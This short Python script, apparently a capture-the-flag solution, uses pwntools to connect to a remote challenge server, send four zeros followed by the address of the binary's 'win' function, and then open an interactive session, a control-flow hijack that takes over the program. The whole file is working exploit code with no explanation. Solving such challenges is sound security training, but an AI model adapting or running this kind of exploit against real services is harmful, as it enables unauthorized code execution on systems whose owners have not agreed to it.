from pwn import *

elf = ELF('./chall')

win_addr = elf.symbols['win']

p = remote('pwn.kosenctf.com', 9001)

def send_elm(num):
  p.readuntil('= ')
  p.sendline(str(num))

for i in range(4):
  send_elm(0)
send_elm(win_addr)

p.interactive()
